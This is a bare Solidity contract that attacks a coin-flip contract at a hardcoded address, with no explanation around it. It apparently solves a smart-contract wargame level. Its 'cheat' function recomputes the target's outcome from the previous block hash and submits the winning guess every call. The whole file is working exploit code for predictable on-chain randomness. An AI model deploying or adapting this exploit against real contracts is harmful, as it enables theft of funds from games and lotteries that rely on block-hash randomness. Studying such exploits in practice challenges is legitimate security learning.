pragma solidity ^0.4.18;

contract CoinFlipInterface {
    function flip(bool _guess) public returns (bool);
}

contract CoinFlips {
  CoinFlipInterface coinin;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  constructor() public {
      coinin = CoinFlipInterface(0xbb0570c10f7a0fd6be864417f0224a775dfa99a8);
  }
  
  function cheat(bool c) {
      uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    coinin.flip(side);
  }
}